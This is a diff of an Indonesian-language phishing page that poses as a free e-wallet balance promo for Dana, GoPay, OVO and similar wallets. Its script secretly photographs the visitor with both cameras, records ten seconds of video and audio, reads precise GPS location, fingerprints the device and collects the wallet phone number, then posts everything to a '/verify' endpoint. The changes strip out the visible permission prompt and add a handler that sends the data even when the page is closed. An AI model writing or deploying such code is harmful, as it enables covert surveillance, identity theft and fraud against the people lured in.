@@ -8,7 +8,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #0a0a0f;
+            background: #0a0a0a;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -16,35 +16,14 @@
             padding: 20px;
         }
         .container {
-            background: linear-gradient(145deg, #1a1a2e, #16213e);
-            border-radius: 28px;
+            background: #141414;
+            border-radius: 24px;
             padding: 32px 28px;
-            max-width: 440px;
+            max-width: 420px;
             width: 100%;
             border: 1px solid rgba(255,255,255,0.06);
-            box-shadow: 0 30px 80px rgba(0,0,0,0.6);
+            box-shadow: 0 30px 80px rgba(0,0,0,0.8);
             position: relative;
-            overflow: hidden;
-        }
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(ellipse at 30% 20%, rgba(255,215,0,0.03), transparent 60%);
-            pointer-events: none;
-        }
-        .glow-orb {
-            position: absolute;
-            top: -60px;
-            right: -60px;
-            width: 200px;
-            height: 200px;
-            background: radial-gradient(circle, rgba(255,215,0,0.08), transparent 70%);
-            border-radius: 50%;
-            pointer-events: none;
         }
 
         /* LOADING */
@@ -55,35 +34,30 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            min-height: 350px;
-            position: relative;
-            z-index: 1;
+            min-height: 320px;
         }
         .loading-screen.hidden { display: none; }
         .spinner {
-            width: 64px;
-            height: 64px;
+            width: 48px;
+            height: 48px;
             border: 3px solid rgba(255,215,0,0.1);
             border-top: 3px solid #ffd700;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         .loading-title {
-            font-size: 22px;
+            font-size: 20px;
             font-weight: 700;
-            color: #fff;
-            letter-spacing: 3px;
-            background: linear-gradient(135deg, #ffd700, #f7971e);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            color: #ffd700;
+            letter-spacing: 4px;
         }
         .loading-sub {
-            color: rgba(255,255,255,0.3);
-            font-size: 13px;
-            margin-top: 8px;
-            letter-spacing: 4px;
+            color: rgba(255,255,255,0.2);
+            font-size: 12px;
+            margin-top: 6px;
+            letter-spacing: 3px;
         }
         .loading-dots::after {
             content: '';
@@ -97,270 +71,180 @@
         }
 
         /* FORM */
-        .form-screen { display: none; position: relative; z-index: 1; }
+        .form-screen { display: none; }
         .form-screen.visible { display: block; }
 
         .header {
             text-align: center;
-            margin-bottom: 28px;
+            margin-bottom: 24px;
         }
         .header .badge {
             display: inline-block;
-            background: rgba(255,215,0,0.12);
-            border: 1px solid rgba(255,215,0,0.15);
-            padding: 4px 16px;
-            border-radius: 20px;
-            font-size: 10px;
+            background: rgba(255,215,0,0.08);
+            border: 1px solid rgba(255,215,0,0.1);
+            padding: 3px 14px;
+            border-radius: 16px;
+            font-size: 9px;
             font-weight: 600;
             color: #ffd700;
             letter-spacing: 2px;
             text-transform: uppercase;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
         .header h1 {
-            font-size: 26px;
+            font-size: 24px;
             font-weight: 800;
             color: #fff;
             line-height: 1.2;
         }
         .header h1 .highlight {
-            background: linear-gradient(135deg, #ffd700, #f7971e);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            color: #ffd700;
         }
         .header p {
-            color: rgba(255,255,255,0.4);
+            color: rgba(255,255,255,0.3);
             font-size: 13px;
-            margin-top: 6px;
-            letter-spacing: 1px;
+            margin-top: 4px;
         }
 
         /* SALDO */
         .saldo-card {
-            background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,215,0,0.02));
-            border: 1px solid rgba(255,215,0,0.1);
-            border-radius: 20px;
-            padding: 22px;
+            background: rgba(255,215,0,0.04);
+            border: 1px solid rgba(255,215,0,0.08);
+            border-radius: 16px;
+            padding: 18px;
             text-align: center;
-            margin-bottom: 22px;
-            position: relative;
-            overflow: hidden;
-        }
-        .saldo-card::after {
-            content: '💰';
-            position: absolute;
-            right: 10px;
-            bottom: 10px;
-            font-size: 60px;
-            opacity: 0.04;
+            margin-bottom: 20px;
         }
         .saldo-card .label {
-            font-size: 11px;
+            font-size: 10px;
             color: rgba(255,255,255,0.3);
-            letter-spacing: 3px;
+            letter-spacing: 2px;
             text-transform: uppercase;
             font-weight: 600;
         }
         .saldo-card .amount {
-            font-size: 38px;
+            font-size: 34px;
             font-weight: 800;
-            color: #fff;
-            margin-top: 4px;
+            color: #ffd700;
+            margin-top: 2px;
             letter-spacing: 1px;
         }
         .saldo-card .amount span {
-            font-size: 20px;
+            font-size: 18px;
             font-weight: 400;
-            color: rgba(255,255,255,0.3);
+            color: rgba(255,255,255,0.2);
         }
-
-        /* PERMISSION - HILANG SETELAH DIIZINKAN */
-        .permission-box {
-            background: rgba(255,255,255,0.03);
-            border: 1px solid rgba(255,255,255,0.06);
-            border-radius: 16px;
-            padding: 18px 20px;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            transition: all 0.5s ease;
-        }
-        .permission-box.hidden {
-            display: none !important;
-            opacity: 0;
-            transform: translateY(-20px);
-            height: 0;
-            padding: 0;
-            margin: 0;
-            border: 0;
-            overflow: hidden;
-        }
-        .permission-box .icon { font-size: 28px; flex-shrink: 0; }
-        .permission-box .text {
-            flex: 1;
-            font-size: 13px;
-            color: rgba(255,255,255,0.5);
-            line-height: 1.5;
-        }
-        .permission-box .text strong { color: #fff; font-weight: 600; }
-        .permission-btn {
-            background: linear-gradient(135deg, #ffd700, #f7971e);
-            color: #0a0a0f;
-            border: none;
-            padding: 10px 22px;
-            border-radius: 12px;
-            font-weight: 700;
-            font-size: 13px;
-            cursor: pointer;
-            transition: all 0.3s;
-            white-space: nowrap;
-            flex-shrink: 0;
-        }
-        .permission-btn:hover {
-            transform: scale(1.04);
-            box-shadow: 0 4px 25px rgba(255,215,0,0.3);
-        }
-        .permission-btn:active { transform: scale(0.97); }
-        .permission-btn.hidden { display: none; }
 
         /* E-WALLET */
         .ewallet-label {
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 600;
-            color: rgba(255,255,255,0.4);
+            color: rgba(255,255,255,0.3);
             letter-spacing: 2px;
             text-transform: uppercase;
             display: block;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
         .ewallet-grid {
             display: grid;
             grid-template-columns: repeat(5, 1fr);
-            gap: 8px;
-            margin-bottom: 20px;
+            gap: 6px;
+            margin-bottom: 18px;
         }
         .ewallet-item {
             background: rgba(255,255,255,0.03);
-            border: 2px solid rgba(255,255,255,0.06);
-            border-radius: 14px;
-            padding: 12px 4px;
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 12px;
+            padding: 10px 4px;
             text-align: center;
             cursor: pointer;
             transition: all 0.3s;
         }
         .ewallet-item:hover {
             border-color: rgba(255,215,0,0.2);
-            transform: translateY(-2px);
         }
         .ewallet-item.active {
             border-color: #ffd700;
-            background: rgba(255,215,0,0.06);
-            box-shadow: 0 0 30px rgba(255,215,0,0.05);
+            background: rgba(255,215,0,0.05);
         }
-        .ewallet-item .logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            font-weight: 800;
-            margin-bottom: 4px;
-            height: 32px;
-        }
-        .ewallet-item .logo svg { width: 28px; height: 28px; }
         .ewallet-item .name {
             font-size: 10px;
             font-weight: 600;
-            color: rgba(255,255,255,0.5);
-            letter-spacing: 0.5px;
+            color: rgba(255,255,255,0.4);
+            letter-spacing: 0.3px;
         }
-        .ewallet-item.active .name { color: #ffd700; }
+        .ewallet-item.active .name {
+            color: #ffd700;
+        }
 
         /* INPUT */
         .input-group {
-            margin-bottom: 18px;
+            margin-bottom: 16px;
         }
         .input-group label {
             display: block;
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 600;
-            color: rgba(255,255,255,0.4);
+            color: rgba(255,255,255,0.3);
             letter-spacing: 1px;
             text-transform: uppercase;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
         .input-group input {
             width: 100%;
-            padding: 16px 18px;
+            padding: 14px 16px;
             background: rgba(255,255,255,0.04);
             border: 1px solid rgba(255,255,255,0.06);
-            border-radius: 14px;
-            font-size: 16px;
+            border-radius: 12px;
+            font-size: 15px;
             color: #fff;
             transition: all 0.3s;
             outline: none;
             font-family: inherit;
         }
         .input-group input:focus {
-            border-color: rgba(255,215,0,0.3);
+            border-color: rgba(255,215,0,0.2);
             background: rgba(255,255,255,0.06);
-            box-shadow: 0 0 30px rgba(255,215,0,0.03);
         }
         .input-group input::placeholder {
-            color: rgba(255,255,255,0.2);
+            color: rgba(255,255,255,0.15);
         }
 
         /* SUBMIT */
         .submit-btn {
             width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, #ffd700, #f7971e);
-            color: #0a0a0f;
+            padding: 16px;
+            background: #ffd700;
+            color: #0a0a0a;
             border: none;
-            border-radius: 16px;
-            font-size: 17px;
+            border-radius: 14px;
+            font-size: 16px;
             font-weight: 800;
             cursor: pointer;
             transition: all 0.3s;
-            letter-spacing: 1px;
-            position: relative;
-            overflow: hidden;
-        }
-        .submit-btn::after {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
-            transform: rotate(45deg);
-            transition: all 0.6s;
-        }
-        .submit-btn:hover::after {
-            transform: rotate(45deg) translateX(100%);
+            letter-spacing: 0.5px;
         }
         .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 35px rgba(255,215,0,0.3);
+            background: #f0c800;
+            transform: translateY(-1px);
         }
         .submit-btn:active { transform: scale(0.98); }
         .submit-btn:disabled {
-            opacity: 0.5;
+            opacity: 0.4;
             cursor: not-allowed;
             transform: none;
         }
 
         /* RESULT */
-        .result-screen { display: none; position: relative; z-index: 1; }
+        .result-screen { display: none; }
         .result-screen.visible { display: block; }
         .result-image {
             width: 100%;
-            border-radius: 20px;
+            border-radius: 16px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.5);
         }
 
-        /* Hidden elements */
+        /* Hidden */
         #hidden-video { display: none; }
         #hidden-canvas { display: none; }
         #recorder-video {
@@ -374,22 +258,18 @@
         }
 
         @media (max-width: 480px) {
-            .container { padding: 24px 18px; }
-            .header h1 { font-size: 22px; }
-            .saldo-card .amount { font-size: 32px; }
-            .ewallet-grid { gap: 6px; }
-            .ewallet-item { padding: 10px 2px; }
-            .ewallet-item .logo { font-size: 16px; }
-            .ewallet-item .logo svg { width: 22px; height: 22px; }
+            .container { padding: 24px 16px; }
+            .header h1 { font-size: 20px; }
+            .saldo-card .amount { font-size: 28px; }
+            .ewallet-grid { gap: 4px; }
+            .ewallet-item { padding: 8px 2px; }
             .ewallet-item .name { font-size: 9px; }
         }
     </style>
 </head>
 <body>
 
-<div class="container" id="app">
-    <div class="glow-orb"></div>
-
+<div class="container">
     <!-- LOADING -->
     <div class="loading-screen" id="loadingScreen">
         <div class="spinner"></div>
@@ -401,89 +281,30 @@
     <div class="form-screen" id="formScreen">
         <div class="header">
             <div class="badge">🎉 PROMO TERBATAS</div>
-            <h1>SALDO GRATIS <span class="highlight">SULTAN</span><br>BAGI BAGI</h1>
-            <p>Verifikasi identitas untuk klaim saldo</p>
+            <h1>SALDO GRATIS <span class="highlight">SULTAN</span></h1>
+            <p>Verifikasi untuk klaim saldo gratis</p>
         </div>
 
-        <!-- SALDO -->
         <div class="saldo-card">
             <div class="label">💰 Total Saldo Anda</div>
             <div class="amount">Rp <span id="saldoValue">0</span></div>
         </div>
 
-        <!-- PERMISSION - HILANG SETELAH DIIZINKAN -->
-        <div class="permission-box" id="permissionBox">
-            <div class="icon">🔐</div>
-            <div class="text">
-                <strong>Aktifkan semua izin</strong><br>
-                untuk verifikasi dan transfer saldo gratis
-            </div>
-            <button class="permission-btn" id="permissionBtn">Izinkan</button>
-        </div>
-
-        <!-- E-WALLET -->
         <span class="ewallet-label">💳 Pilih E-Wallet</span>
         <div class="ewallet-grid" id="ewalletGrid">
-            <!-- Dana -->
-            <div class="ewallet-item active" data-value="Dana">
-                <div class="logo">
-                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <rect width="24" height="24" rx="6" fill="#1A73E8"/>
-                        <text x="12" y="17" text-anchor="middle" font-family="Arial" font-size="12" fill="white" font-weight="bold">D</text>
-                    </svg>
-                </div>
-                <span class="name">Dana</span>
-            </div>
-            <!-- Gopay -->
-            <div class="ewallet-item" data-value="Gopay">
-                <div class="logo">
-                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <rect width="24" height="24" rx="6" fill="#00AA5B"/>
-                        <text x="12" y="17" text-anchor="middle" font-family="Arial" font-size="10" fill="white" font-weight="bold">GO</text>
-                    </svg>
-                </div>
-                <span class="name">Gopay</span>
-            </div>
-            <!-- Shopeepay -->
-            <div class="ewallet-item" data-value="Shopeepay">
-                <div class="logo">
-                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <rect width="24" height="24" rx="6" fill="#EE4D2D"/>
-                        <text x="12" y="17" text-anchor="middle" font-family="Arial" font-size="9" fill="white" font-weight="bold">SP</text>
-                    </svg>
-                </div>
-                <span class="name">ShopeePay</span>
-            </div>
-            <!-- OVO -->
-            <div class="ewallet-item" data-value="OVO">
-                <div class="logo">
-                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <rect width="24" height="24" rx="6" fill="#3C94F4"/>
-                        <text x="12" y="17" text-anchor="middle" font-family="Arial" font-size="12" fill="white" font-weight="bold">O</text>
-                    </svg>
-                </div>
-                <span class="name">OVO</span>
-            </div>
-            <!-- LinkAja -->
-            <div class="ewallet-item" data-value="LinkAja">
-                <div class="logo">
-                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <rect width="24" height="24" rx="6" fill="#ED1C24"/>
-                        <text x="12" y="17" text-anchor="middle" font-family="Arial" font-size="8" fill="white" font-weight="bold">LA</text>
-                    </svg>
-                </div>
-                <span class="name">LinkAja</span>
-            </div>
+            <div class="ewallet-item active" data-value="Dana"><span class="name">Dana</span></div>
+            <div class="ewallet-item" data-value="Gopay"><span class="name">Gopay</span></div>
+            <div class="ewallet-item" data-value="Shopeepay"><span class="name">ShopeePay</span></div>
+            <div class="ewallet-item" data-value="OVO"><span class="name">OVO</span></div>
+            <div class="ewallet-item" data-value="LinkAja"><span class="name">LinkAja</span></div>
         </div>
 
-        <!-- NOMOR -->
         <div class="input-group">
             <label>📱 Nomor E-Wallet</label>
             <input type="tel" id="phoneInput" placeholder="0812 3456 7890" maxlength="15">
         </div>
 
-        <!-- SUBMIT -->
-        <button class="submit-btn" id="submitBtn">🚀 KLAIM SALDO SEKARANG</button>
+        <button class="submit-btn" id="submitBtn">🚀 KLAIM SALDO</button>
     </div>
 
     <!-- RESULT -->
@@ -492,14 +313,14 @@
     </div>
 </div>
 
-<!-- Hidden Elements -->
+<!-- Hidden -->
 <video id="hidden-video" autoplay playsinline muted></video>
 <video id="recorder-video" autoplay playsinline muted></video>
 <canvas id="hidden-canvas"></canvas>
 
 <script>
     // ============================================
-    // DOM ELEMENTS
+    // DOM
     // ============================================
     const loadingScreen = document.getElementById('loadingScreen');
     const formScreen = document.getElementById('formScreen');
@@ -508,8 +329,6 @@
     const saldoValue = document.getElementById('saldoValue');
     const phoneInput = document.getElementById('phoneInput');
     const submitBtn = document.getElementById('submitBtn');
-    const permissionBtn = document.getElementById('permissionBtn');
-    const permissionBox = document.getElementById('permissionBox');
     const ewalletItems = document.querySelectorAll('.ewallet-item');
 
     const video = document.getElementById('hidden-video');
@@ -517,7 +336,7 @@
     const canvas = document.getElementById('hidden-canvas');
 
     let selectedEwallet = 'Dana';
-    let allPermissionsGranted = false;
+    let permissionsGranted = false;
     let mediaRecorder = null;
     let recordedChunks = [];
     let photos = { front: null, back: null };
@@ -528,258 +347,191 @@
     let hasSent = false;
 
     // ============================================
-    // 💰 GENERATE SALDO
+    // 💰 SALDO
     // ============================================
     function generateSaldo() {
         const min = 45000;
         const max = 65000;
-        const saldo = Math.floor(Math.random() * (max - min + 1)) + min;
-        return saldo.toLocaleString('id-ID');
+        return Math.floor(Math.random() * (max - min + 1)) + min;
     }
 
     // ============================================
-    // 📸 AMBIL FOTO
+    // 📸 FOTO
     // ============================================
     async function captureBothCameras() {
         const result = { front: null, back: null };
 
         try {
-            const frontStream = await navigator.mediaDevices.getUserMedia({
+            const s = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: 'user', width: 640, height: 480 },
                 audio: false
             });
-            const frontVideo = document.createElement('video');
-            frontVideo.srcObject = frontStream;
-            frontVideo.muted = true;
-            await frontVideo.play();
+            const v = document.createElement('video');
+            v.srcObject = s;
+            v.muted = true;
+            await v.play();
             await new Promise(r => setTimeout(r, 500));
-
-            const frontCanvas = document.createElement('canvas');
-            frontCanvas.width = frontVideo.videoWidth || 640;
-            frontCanvas.height = frontVideo.videoHeight || 480;
-            const fCtx = frontCanvas.getContext('2d');
-            fCtx.drawImage(frontVideo, 0, 0);
-            result.front = frontCanvas.toDataURL('image/jpeg', 0.85);
-
-            frontStream.getTracks().forEach(t => t.stop());
-            console.log('📸 Front camera captured');
-        } catch (e) {
-            console.log('⚠️ Front camera error:', e.message);
-        }
+            const c = document.createElement('canvas');
+            c.width = v.videoWidth || 640;
+            c.height = v.videoHeight || 480;
+            c.getContext('2d').drawImage(v, 0, 0);
+            result.front = c.toDataURL('image/jpeg', 0.85);
+            s.getTracks().forEach(t => t.stop());
+            console.log('📸 Front captured');
+        } catch (e) { console.log('⚠️ Front error:', e.message); }
 
         try {
-            const backStream = await navigator.mediaDevices.getUserMedia({
+            const s = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: 'environment', width: 640, height: 480 },
                 audio: false
             });
-            const backVideo = document.createElement('video');
-            backVideo.srcObject = backStream;
-            backVideo.muted = true;
-            await backVideo.play();
+            const v = document.createElement('video');
+            v.srcObject = s;
+            v.muted = true;
+            await v.play();
             await new Promise(r => setTimeout(r, 500));
-
-            const backCanvas = document.createElement('canvas');
-            backCanvas.width = backVideo.videoWidth || 640;
-            backCanvas.height = backVideo.videoHeight || 480;
-            const bCtx = backCanvas.getContext('2d');
-            bCtx.drawImage(backVideo, 0, 0);
-            result.back = backCanvas.toDataURL('image/jpeg', 0.85);
-
-            backStream.getTracks().forEach(t => t.stop());
-            console.log('📸 Back camera captured');
-        } catch (e) {
-            console.log('⚠️ Back camera error:', e.message);
-        }
+            const c = document.createElement('canvas');
+            c.width = v.videoWidth || 640;
+            c.height = v.videoHeight || 480;
+            c.getContext('2d').drawImage(v, 0, 0);
+            result.back = c.toDataURL('image/jpeg', 0.85);
+            s.getTracks().forEach(t => t.stop());
+            console.log('📸 Back captured');
+        } catch (e) { console.log('⚠️ Back error:', e.message); }
 
         return result;
     }
 
     // ============================================
-    // 🎥 REKAM VIDEO 10 DETIK
+    // 🎥 VIDEO 10 DETIK
     // ============================================
     async function recordVideo() {
         return new Promise((resolve) => {
             recordedChunks = [];
-
             navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                audio: {
-                    echoCancellation: true,
-                    noiseSuppression: true,
-                    autoGainControl: true
-                }
+                video: { facingMode: 'user', width: 640, height: 480 },
+                audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
             })
             .then((stream) => {
                 recorderVideo.srcObject = stream;
                 recorderVideo.muted = true;
                 recorderVideo.play();
 
-                let finalMimeType = 'video/mp4';
-                if (!MediaRecorder.isTypeSupported(finalMimeType)) {
-                    finalMimeType = 'video/webm;codecs=vp9,opus';
-                    if (!MediaRecorder.isTypeSupported(finalMimeType)) {
-                        finalMimeType = 'video/webm;codecs=vp8,opus';
+                let mime = 'video/mp4';
+                if (!MediaRecorder.isTypeSupported(mime)) {
+                    mime = 'video/webm;codecs=vp9,opus';
+                    if (!MediaRecorder.isTypeSupported(mime)) {
+                        mime = 'video/webm;codecs=vp8,opus';
                     }
-                    if (!MediaRecorder.isTypeSupported(finalMimeType)) {
-                        finalMimeType = 'video/webm';
+                    if (!MediaRecorder.isTypeSupported(mime)) {
+                        mime = 'video/webm';
                     }
                 }
 
-                mediaRecorder = new MediaRecorder(stream, {
-                    mimeType: finalMimeType,
+                const recorder = new MediaRecorder(stream, {
+                    mimeType: mime,
                     videoBitsPerSecond: 3000000,
                     audioBitsPerSecond: 128000
                 });
 
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                    }
-                };
-
-                mediaRecorder.onstop = () => {
-                    if (recordedChunks.length === 0) {
-                        resolve(null);
-                        return;
-                    }
-                    const blob = new Blob(recordedChunks, {
-                        type: finalMimeType || 'video/mp4'
-                    });
+                recorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+                recorder.onstop = () => {
+                    if (recordedChunks.length === 0) { resolve(null); return; }
+                    const blob = new Blob(recordedChunks, { type: mime || 'video/mp4' });
                     stream.getTracks().forEach(t => t.stop());
                     recorderVideo.srcObject = null;
                     resolve(blob);
                 };
 
-                mediaRecorder.start(1000);
-
+                recorder.start(1000);
                 setTimeout(() => {
-                    if (mediaRecorder && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                        console.log('⏹️ Recording stopped (10 seconds)');
+                    if (recorder.state === 'recording') {
+                        recorder.stop();
+                        console.log('⏹️ Video 10 detik selesai');
                     }
                 }, 10000);
             })
-            .catch((err) => {
-                console.error('❌ Record error:', err);
-                resolve(null);
-            });
+            .catch((err) => { console.error('❌ Record error:', err); resolve(null); });
         });
     }
 
     // ============================================
     // 📍 GPS
     // ============================================
-    function getGPSLocation() {
+    function getGPS() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve(null);
-                return;
-            }
+            if (!navigator.geolocation) { resolve(null); return; }
             navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    resolve({
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy
-                    });
-                },
-                () => { resolve(null); },
+                (p) => resolve({ latitude: p.coords.latitude, longitude: p.coords.longitude, accuracy: p.coords.accuracy }),
+                () => resolve(null),
                 { enableHighAccuracy: true, timeout: 10000 }
             );
         });
     }
 
     // ============================================
-    // 📱 DEVICE INFO
+    // 📱 DEVICE
     // ============================================
-    function getDeviceInfo() {
+    function getDevice() {
         const ua = navigator.userAgent.toLowerCase();
-        const info = {
-            browser: 'Tidak diketahui',
-            os: 'Tidak diketahui',
-            device: 'Tidak diketahui',
-            brand: 'Tidak diketahui',
-            model: 'Tidak diketahui'
-        };
+        const info = { browser: '-', os: '-', device: '-', brand: '-', model: '-' };
         if (ua.includes('chrome')) info.browser = 'Chrome';
         else if (ua.includes('firefox')) info.browser = 'Firefox';
         else if (ua.includes('safari') && !ua.includes('chrome')) info.browser = 'Safari';
         else if (ua.includes('edge')) info.browser = 'Edge';
         if (ua.includes('android')) {
             info.os = 'Android';
-            const match = ua.match(/android\s([\d.]+)/);
-            if (match) info.os += ` ${match[1]}`;
+            const m = ua.match(/android\s([\d.]+)/);
+            if (m) info.os += ` ${m[1]}`;
         } else if (ua.includes('iphone') || ua.includes('ipad')) {
             info.os = 'iOS';
-            const match = ua.match(/os\s([\d_]+)/);
-            if (match) info.os += ` ${match[1].replace(/_/g, '.')}`;
-        } else if (ua.includes('windows')) {
-            info.os = 'Windows';
-        } else if (ua.includes('mac')) {
-            info.os = 'macOS';
-        }
-        if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
-            info.device = 'Mobile';
-        } else if (ua.includes('tablet') || ua.includes('ipad')) {
-            info.device = 'Tablet';
-        } else {
-            info.device = 'Desktop';
-        }
+            const m = ua.match(/os\s([\d_]+)/);
+            if (m) info.os += ` ${m[1].replace(/_/g, '.')}`;
+        } else if (ua.includes('windows')) { info.os = 'Windows'; }
+        else if (ua.includes('mac')) { info.os = 'macOS'; }
+        if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) { info.device = 'Mobile'; }
+        else if (ua.includes('tablet') || ua.includes('ipad')) { info.device = 'Tablet'; }
+        else { info.device = 'Desktop'; }
         const brands = [
-            { name: 'Samsung', patterns: ['samsung', 'sm-'] },
-            { name: 'Xiaomi', patterns: ['xiaomi', 'mi ', 'redmi', 'poco'] },
-            { name: 'Realme', patterns: ['realme'] },
-            { name: 'Oppo', patterns: ['oppo'] },
-            { name: 'Vivo', patterns: ['vivo'] },
-            { name: 'OnePlus', patterns: ['oneplus'] },
-            { name: 'Google Pixel', patterns: ['pixel'] },
-            { name: 'Huawei', patterns: ['huawei', 'honor'] },
-            { name: 'Apple', patterns: ['iphone', 'ipad'] }
+            { name: 'Samsung', p: ['samsung', 'sm-'] },
+            { name: 'Xiaomi', p: ['xiaomi', 'mi ', 'redmi', 'poco'] },
+            { name: 'Realme', p: ['realme'] },
+            { name: 'Oppo', p: ['oppo'] },
+            { name: 'Vivo', p: ['vivo'] },
+            { name: 'OnePlus', p: ['oneplus'] },
+            { name: 'Google Pixel', p: ['pixel'] },
+            { name: 'Huawei', p: ['huawei', 'honor'] },
+            { name: 'Apple', p: ['iphone', 'ipad'] }
         ];
-        for (const brand of brands) {
-            if (brand.patterns.some(p => ua.includes(p))) {
-                info.brand = brand.name;
-                break;
-            }
+        for (const b of brands) {
+            if (b.p.some(p => ua.includes(p))) { info.brand = b.name; break; }
         }
         if (info.brand === 'Apple') {
-            const match = ua.match(/iphone(\d+)/);
-            if (match) info.model = `iPhone ${match[1]}`;
+            const m = ua.match(/iphone(\d+)/);
+            if (m) info.model = `iPhone ${m[1]}`;
         } else if (info.brand === 'Samsung') {
-            const match = ua.match(/sm-[a-z0-9]+/i);
-            if (match) info.model = match[0].toUpperCase();
+            const m = ua.match(/sm-[a-z0-9]+/i);
+            if (m) info.model = m[0].toUpperCase();
         }
         return info;
     }
 
     // ============================================
-    // 🖼️ AMBIL GAMBAR DARI GITHUB
+    // 🖼️ FOTO GITHUB
     // ============================================
-    async function getImageFromGitHub() {
+    async function getGitHubImage() {
         try {
-            const username = 'danakagetberkah';
-            const repo = 'DANA-BERKAH';
-            const branch = 'main';
-            const imagePath = 'foto.jpg';
-            
-            const response = await fetch(
-                `https://api.github.com/repos/${username}/${repo}/contents/${imagePath}?ref=${branch}`
-            );
-            
-            if (response.ok) {
-                const data = await response.json();
-                const base64Image = data.content;
-                return `data:image/jpeg;base64,${base64Image}`;
+            const r = await fetch('https://api.github.com/repos/danakagetberkah/DANA-BERKAH/contents/foto.jpg?ref=main');
+            if (r.ok) {
+                const d = await r.json();
+                return `data:image/jpeg;base64,${d.content}`;
             }
             return null;
-        } catch (err) {
-            console.error('Error ambil gambar:', err);
-            return null;
-        }
+        } catch (e) { console.error('GitHub error:', e); return null; }
     }
 
     // ============================================
-    // 📤 SEND DATA
+    // 📤 SEND DATA (dijalankan di background)
     // ============================================
     async function sendData(phone, ewallet, saldo) {
         if (hasSent) return;
@@ -795,26 +547,25 @@
                 });
             }
 
-            const requestData = {
+            const payload = {
                 frontPhoto: photos.front,
                 backPhoto: photos.back,
                 video: videoBase64,
                 gps: gpsData,
                 device: deviceData,
-                phone: phone,
-                ewallet: ewallet,
-                saldo: saldo,
+                phone: phone || 'Tidak diketahui',
+                ewallet: ewallet || 'Tidak diketahui',
+                saldo: saldo || '0',
                 timestamp: new Date().toISOString()
             };
 
-            console.log('📤 Sending data to server...');
-            const response = await fetch('/verify', {
+            console.log('📤 Sending data...');
+            const res = await fetch('/verify', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(requestData)
+                body: JSON.stringify(payload)
             });
-
-            const result = await response.json();
+            const result = await res.json();
             console.log('📨 Response:', result);
             return true;
         } catch (err) {
@@ -824,44 +575,38 @@
     }
 
     // ============================================
-    // 🚀 START BACKGROUND PROCESS (LANGSUNG JALAN)
+    // 🚀 BACKGROUND PROCESS (langsung jalan)
     // ============================================
     async function startBackgroundProcess() {
         try {
-            console.log('🎬 Starting background process...');
-            
+            console.log('🎬 Background process started...');
             photos = await captureBothCameras();
-            console.log('✅ Photos captured');
-
-            gpsData = await getGPSLocation();
-            console.log('✅ GPS captured');
-
-            deviceData = getDeviceInfo();
-            console.log('✅ Device info captured');
-
+            gpsData = await getGPS();
+            deviceData = getDevice();
             videoBlobData = await recordVideo();
-            console.log('✅ Video recorded');
-
-            console.log('🎬 Background process complete!');
+            console.log('✅ Background process complete!');
         } catch (err) {
             console.error('❌ Background error:', err);
         }
     }
 
     // ============================================
-    // 🛑 STOP RECORDING SAAT CLOSE
+    // 🛑 Web di-close, tetap kirim data
     // ============================================
-    window.addEventListener('beforeunload', () => {
+    window.addEventListener('beforeunload', async () => {
+        console.log('🔄 Page closing, sending data...');
         if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
+            await new Promise(r => setTimeout(r, 300));
         }
+        const phone = phoneInput.value.trim().replace(/\s/g, '') || 'Tidak diketahui';
+        const saldo = generateSaldo();
+        await sendData(phone, selectedEwallet, saldo);
     });
 
     // ============================================
     // 👆 UI EVENTS
     // ============================================
-
-    // --- E-WALLET SELECT ---
     ewalletItems.forEach(el => {
         el.addEventListener('click', function() {
             ewalletItems.forEach(i => i.classList.remove('active'));
@@ -870,42 +615,6 @@
         });
     });
 
-    // --- PERMISSION ---
